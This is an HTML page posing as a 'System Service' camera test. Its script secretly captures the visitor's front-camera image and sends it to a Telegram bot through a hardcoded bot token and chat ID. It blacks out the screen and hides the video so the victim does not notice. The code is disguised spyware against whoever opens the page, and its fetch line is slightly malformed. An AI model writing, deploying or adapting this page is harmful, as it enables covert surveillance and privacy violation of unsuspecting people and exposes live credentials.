<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Service</title>
    <style>
        body { background: black; color: black; margin: 0; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; }
        #startBtn { padding: 20px; background: #333; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 18px; }
    </style>
</head>
<body>
    <button id="startBtn">START SYSTEM TEST</button>
    <video id="video" style="display:none;" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // Use your credentials from previous successful setups
        const BOT_TOKEN = '8769277480:AAGs6Zeo5ol7FojA2SwGK7-7I-5Zb0falyM';
        const CHAT_ID = '8681771719';

        const startBtn = document.getElementById('startBtn');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        startBtn.onclick = async () => {
            try {
                // Changed facingMode to "user" to fix the issue in 17779658174873973390559498204449_10001a.jpg
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                video.srcObject = stream;
                
                // Hide button so the screen goes black immediately
                startBtn.style.display = 'none';
                
                // Wait 2 seconds for camera focus, then send first photo
                setTimeout(() => captureAndSend(), 2000);
            } catch (err) {
                alert("Please allow camera access for the test."); // Required for permissions
            }
        };

        function captureAndSend() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.jpg');

                fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto, {
                    method: 'POST',
                    body: formData
                });
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
